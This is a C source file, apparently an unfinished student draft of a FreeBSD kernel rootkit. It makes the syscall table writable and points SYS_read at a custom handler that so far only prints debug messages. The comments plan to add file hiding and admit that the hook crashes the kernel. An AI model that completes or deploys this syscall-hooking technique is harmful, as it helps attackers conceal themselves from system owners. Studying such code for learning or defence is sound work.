// To keep this file relativly clean all non-essential notes can be referecned by number in an additional file named "lkm_notes.txt"

// See 1.

// Necessary headers, See 2. 
#include <sys/param.h>
#include <sys/kernel.h>
#include <sys/module.h>
#include <sys/systm.h>
#include <sys/sysent.h>
#include <sys/syscall.h>
#include <sys/proc.h>
#include <sys/sysproto.h>
#include <sys/types.h>
// for making memory addresses writable 
#include <vm/vm.h>
#include <vm/pmap.h>


// this is for reference, this is what a sysent entry is 
// struct sysent {
    // int sy_narg;         // Number of arguments the syscall takes
    // sy_call_t *sy_call;  // Pointer to the syscall handler function
// };


// This is a pointer to sysread in memory, See 3.
static struct sysent *original_sysread;



// All.
// New
// Handlers
// Go
// Here

// we could also implement a switch statement here as opposed to if's and else if's for what invoked the syscall
static int custom_sysread(struct thread *td, void *syscall_args) {


    uprintf("SUCCESSFULY POINTED TO NEW FUNCTION");
    uprintf("SUCCESSFULY POINTED TO NEW FUNCTION");
    uprintf("SUCCESSFULY POINTED TO NEW FUNCTION");
    uprintf("SUCCESSFULY POINTED TO NEW FUNCTION");
    uprintf("SUCCESSFULY POINTED TO NEW FUNCTION");
    uprintf("SUCCESSFULY POINTED TO NEW FUNCTION");
    uprintf("SUCCESSFULY POINTED TO NEW FUNCTION");
    uprintf("SUCCESSFULY POINTED TO NEW FUNCTION");
    uprintf("SUCCESSFULY POINTED TO NEW FUNCTION");
    uprintf("SUCCESSFULY POINTED TO NEW FUNCTION");
    uprintf("SUCCESSFULY POINTED TO NEW FUNCTION");
    uprintf("SUCCESSFULY POINTED TO NEW FUNCTION");
    uprintf("SUCCESSFULY POINTED TO NEW FUNCTION");
    uprintf("SUCCESSFULY POINTED TO NEW FUNCTION");
    uprintf("SUCCESSFULY POINTED TO NEW FUNCTION");
    uprintf("SUCCESSFULY POINTED TO NEW FUNCTION");
    uprintf("SUCCESSFULY POINTED TO NEW FUNCTION");
    uprintf("SUCCESSFULY POINTED TO NEW FUNCTION");
    uprintf("SUCCESSFULY POINTED TO NEW FUNCTION");
    uprintf("SUCCESSFULY POINTED TO NEW FUNCTION");
    // value returned by og sys_read indicating success or if an error occured
    int original_sysread_return;
    // invoke og syscall
    // original_sysread is pointer to the struct sys_read
    // sy_call is a member of that struct
    // ->, is accessing the member and invoking it
    original_sysread_return = original_sysread->sy_call(td, syscall_args);

    // check if an error occured
    if (original_sysread_return != 0) {
        uprintf("Original SYS_read returned error: %d\n", original_sysread_return);
        return original_sysread_return;
    }

    // see what process invoked it
    // if ls invoked
    // this is a temporary line to see if we sucessfully switched the syscall and called them correctly
    uprintf("HOLY SHIT IT'S WORKING!!!!!!!!!!\n");
    // if something else invoked it
    // else, return error;
    return original_sysread_return;

    // do some functionality before the wrapper collects the response from CPU registers 

    // what do these lines actually do???
    // .sy_call = (sy_call_t *)custom_read, // Your custom handler function
    // .sy_narg = 3,                       // Number of arguments for SYS_read
    // options of where to commit out changes

    // 1.
    // change input before SYS_read gets invoked
    // search for addresses of things to remove, make kernel not look for that within its execution


    // 2.
}




// Find the memory address of the sysent table and point to our handlers if found.
static int find_sysread_address (void) {

    // Store memory address of sysent table, See 4.

    original_sysread = &sysent[SYS_read];

    // see if we can point to our custom handler
    if (original_sysread->sy_call) {
        uprintf("Sysread found at address: %p\n", original_sysread->sy_call);
        // point to custom handler, with synchronization to avoid unwanted kernel behaiver
        // critical_enter();  // Enter critical section

        // .sy_call in the struct sysent is of the type sy_call_t *, 
        // which is a pointer to a function with the following signature:
        //typedef int sy_call_t(struct thread *td, void *syscall_args); (not a real line of code just pertains to the above lines)
        // this line is causing everything to crash!!!
        // this line is causing everything to crash!!!
        // this line is causing everything to crash!!!
        // this line is causing everything to crash!!!
        // this line is causing everything to crash!!!
        // this line is causing everything to crash!!!
        // this line is causing everything to crash!!!
        // this line is causing everything to crash!!!
        // this line is causing everything to crash!!!
        // this line is causing everything to crash!!!
        // this line is causing everything to crash!!!
        // this line is causing everything to crash!!!
        // this line is causing everything to crash!!!
        // this line is causing everything to crash!!!
        // this line is causing everything to crash!!!

        // make sysent memory address writable
        vm_offset_t addr = (vm_offset_t)&sysent[SYS_read];  // Get the address of sysent[SYS_read]

        pmap_protect(kernel_pmap,                        // Kernel's page map
                 trunc_page(addr),                   // Align to the start of the page
                 round_page(addr + sizeof(struct sysent)),  // Align to the end of the page
                 VM_PROT_READ | VM_PROT_WRITE);

        // change sysent sy_call pointer to our point to our custom handler
        sysent[SYS_read].sy_call = (sy_call_t *)custom_sysread; 

        // set back to read only
        pmap_protect(kernel_pmap,                        // Kernel's page map
                 trunc_page(addr),                   // Align to the start of the page
                 round_page(addr + sizeof(struct sysent)),  // Align to the end of the page
                 VM_PROT_READ);                      // Set to read-only



        // critical_exit();   // Exit critical section

        return 0;
    }
    else {
        uprintf("sysread not found.\n");
        return 1;
    }
}



// Create a handler for the LKM, See 5.
static int rootkit_handler(struct module *module, int event, void *arg) {

    // This is the result of looking for the memory address of the sysent table, it will be 0 if successfull and anything else for other cases
    int search_table_case = 0;
    switch (event) {
    case MOD_LOAD:

        search_table_case = find_sysread_address();
        if (search_table_case == 0) {
            uprintf("No error with finding sysent table address.\n");
        }
        else {
            uprintf("Problems!\n");
            uprintf("Problems!\n");
            uprintf("Problems!\n");
            uprintf("error code: %d!\n", search_table_case);
        }
        break;
    case MOD_UNLOAD:
        uprintf("Goodbye, Kernel!\n");
        break;
    default:
        return EOPNOTSUPP;  // Unsupported operation
    }
    return 0;
}










// Module metadata and registration, See 6.
static moduledata_t rootkit_mod = {
    "rootkit",              // Module name
    rootkit_handler,        // Event handler
    NULL                  // Extra data (optional)
};


// Register the module, See 7.
DECLARE_MODULE(rootkit, rootkit_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);